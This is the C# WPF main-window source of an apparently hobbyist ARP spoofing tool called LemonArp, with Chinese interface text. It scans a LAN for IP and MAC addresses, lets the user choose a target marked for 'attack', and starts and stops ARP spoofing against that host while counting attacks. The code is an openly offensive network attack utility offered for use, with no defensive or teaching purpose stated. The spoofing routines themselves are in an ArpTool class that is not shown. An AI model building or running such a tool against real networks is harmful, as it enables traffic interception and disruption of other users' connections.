using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace LemonArp
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            IPMACMapList = new List<Tuple<IPAddress, PhysicalAddress>>();
            timer1.Interval = 1000;
            timer1.Tick += delegate {tit.Text = "攻击次数:" + arpTool.d; };
        }
        System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();

        private LibPcapLiveDeviceList deviceList;

        private ArpTool arpTool = null;

        private List<Tuple<IPAddress, PhysicalAddress>> IPMACMapList;
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            deviceList = LibPcapLiveDeviceList.Instance;

            if (deviceList.Count < 1)
            {
                throw new Exception("没有发现本机上的网络设备");
            }

            foreach (var device in deviceList)
            {
                try
                {
                    arpTool = new ArpTool(device);
                    arpTool.ScanStopedEvent += delegate { this.Dispatcher.BeginInvoke(new Action(async delegate { tit.Text = "IP扫描完成"; await Task.Delay(3000); tit.Text = "请选择要攻击的IP"; sra.Text = "搜索"; })); };
                    arpTool.ResolvedEvent += arpTool_ResolvedEvent;
                    tit.Text = "网关IP: " + arpTool.GetwayIP + "  本地IP: " + arpTool.LocalIP;
                    stip .Text =clip.Text = arpTool.GetwayIP.ToString();
                    if (arpTool.GetwayIP.ToString() != "")
                        return;
                }
                catch { }
            }
        }

        private void arpTool_ResolvedEvent(object sender, ResolvedEventArgs e)
        {
            IPMACMapList.Add(new Tuple<IPAddress, PhysicalAddress>(e.IPAddress, e.PhysicalAddress));
            this.Dispatcher.BeginInvoke(new Action(delegate { dt.Items.Add(new ListBoxItem() { Content = $"{e.IPAddress}  -  {e.PhysicalAddress}", ToolTip = e.IPAddress }); }));
        }

        private void dt_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (dt.SelectedIndex != -1)
                dtip.Text = (dt.SelectedItem as ListBoxItem).ToolTip.ToString();
        }

        private void Border_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ClickCount == 1)
            {
                if (but.Text == "攻击")
                {
                    if (dtip.Text != "")
                    {
                        timer1.Start();
                        var destIP = IPMACMapList[dt.SelectedIndex].Item1;
                        var destMAC = IPMACMapList[dt.SelectedIndex].Item2;
                        arpTool.ARPSpoofing1(destIP, destMAC);
                        but.Text = "停止";
                    }
                    else { tit.Text = "请选择一只你要攻击的IP"; }
                }
                else
                {
                    timer1.Stop();
                    arpTool.StopARPSpoofing();
                    but.Text = "攻击";
                }
            }
        }

        private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
                this.DragMove();
        }

        private void Border_MouseDown_1(object sender, MouseButtonEventArgs e)
        {
            Environment.Exit(0);
        }

        private void Border_MouseDown_2(object sender, MouseButtonEventArgs e)
        {
            if (sra.Text == "搜索")
            {
                IPAddress startIP, endIP;
                if (!IPAddress.TryParse(stip.Text, out startIP) || !IPAddress.TryParse(clip.Text, out endIP))
                {
                    tit.Text = "不正确的IP地址";
                    return;
                }

                IP start = new IP(startIP);
                IP end = new IP(endIP);
                if (end.SmallerThan(start))
                {
                    tit.Text = "开始地址大于结束地址";
                    return;
                }

                sra.Text = "停止";
                IPMACMapList.Clear();
                dt.Items.Clear();
                arpTool.ScanLAN(start, end);
            }
            else
            {
                arpTool.StopScanLan();
                sra.Text = "搜索";
            }
        }
    }
}
